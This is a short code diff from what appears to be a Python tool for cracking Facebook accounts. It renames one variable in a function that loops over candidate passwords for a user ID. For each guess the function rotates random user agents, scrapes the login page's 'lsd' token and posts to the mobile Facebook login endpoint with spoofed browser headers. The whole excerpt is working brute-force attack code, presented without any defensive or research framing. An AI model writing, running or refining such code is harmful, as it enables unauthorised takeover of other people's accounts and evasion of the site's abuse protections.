@@ -1002,7 +1002,7 @@ def gxds_files(uid, pxss):
     session = requests.Session()
     try:
         for ps in pxss:
-            uuu = random.choice(gxdsUArndm)
+            qwerty = random.choice(gxdsUArndm)
             gxdsfbs = session.get("https://n.facebook.com").text
             info = {
                 "lsd": re.search('name="lsd" value="(.*?)"', str(gxdsfbs)).group(1),
@@ -1037,7 +1037,7 @@ def gxds_files(uid, pxss):
                 "priority": "u=1",
                 "cross-origin-resource-policy": "cross-origin",
                 "upgrade-insecure-requests": "1",
-                "user-agent": uuu,
+                "user-agent": qwerty,
             }
             session.post(
                 url="https://n.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
